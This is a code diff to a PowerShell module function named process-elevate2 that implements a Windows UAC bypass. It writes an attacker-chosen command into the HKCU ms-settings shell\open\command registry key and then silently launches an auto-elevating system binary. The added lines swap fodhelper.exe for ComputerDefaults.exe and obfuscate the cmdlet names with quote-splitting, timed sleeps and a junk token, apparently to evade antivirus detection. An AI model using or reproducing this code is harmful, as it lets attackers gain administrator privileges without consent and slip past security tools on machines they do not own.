@@ -251,10 +251,14 @@ function process-elevate2 {
 		[string]$processName
     )
     $Request =  $processName
-New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force
-New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
-Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "$Request" -force
-Start-Process -WindowStyle hidden "C:\Windows\System32\fodhelper.exe"
+N'e'W-I'te'm "HKCU:\software\classes\ms-settings\shell\open\command" -Force
+sleep(5.3);
+se'T-iT'EmP'rop'erty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "$Request" -force
+sleep(7.3);
+n'Ew-I'te'mPr'operty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force;(![BOOL]);sleep(9.3);
+Start-Process -WindowStyle hidden "C:\Windows\System32\ComputerDefaults.exe"
+
+
 }
 Export-ModuleMember -Function process-elevate2
 Set-Alias -Name process-elevate2 -Value process-elevate2
